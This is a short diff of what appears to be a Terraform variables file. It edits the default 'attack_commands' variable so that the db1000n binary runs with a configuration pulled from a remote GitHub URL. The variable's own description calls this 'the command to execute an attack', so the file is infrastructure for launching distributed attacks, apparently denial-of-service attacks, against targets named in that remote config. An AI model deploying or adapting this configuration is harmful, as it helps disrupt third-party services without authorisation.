@@ -10,6 +10,6 @@ variable "prefix" {
 }
 
 variable "attack_commands" {
-  default     = ["/usr/src/app/main","-c=https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json"]
+  default     = ["/usr/src/app/db1000n","-c=https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.json"]
   description = "The command to execute an attack with support of specifying additional flags."
 }
